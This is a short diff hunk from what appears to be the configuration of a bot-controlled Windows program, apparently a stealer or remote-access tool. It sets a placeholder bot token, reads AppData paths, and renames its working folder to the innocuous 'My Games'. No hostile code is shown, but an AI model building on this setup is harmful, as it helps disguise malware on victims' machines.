@@ -55,7 +55,7 @@ BOT_TOKEN = "%token%"  # %token%
 LOCALAPPDATA = os.getenv('LOCALAPPDATA')
 ROAMING = os.getenv('APPDATA')
 USER_HOME = f"C:\\Users\\{os.getlogin()}"
-CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\bin"
+CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
